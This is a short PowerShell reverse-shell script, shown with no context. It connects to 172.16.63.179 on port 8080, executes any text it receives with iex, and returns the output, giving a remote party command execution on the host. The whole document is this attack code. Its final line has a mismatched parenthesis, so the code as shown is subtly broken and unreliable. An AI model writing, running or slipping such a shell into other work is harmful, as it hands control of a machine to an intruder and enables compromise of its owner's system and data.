$sm=(new-object Net.Sockets.TCPClient("172.16.63.179", 8080)).GetStream();
[byte[]]$bt=0..65535|%{0}
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
    $d=(new-object Text.ASCIIEncoding).getSTring($bt,0,$i)
    $st=([text.encoding]::ASCII).getBytes((iex $d 2>&1))
    $sm.Write(($st,0,$st.Length)
}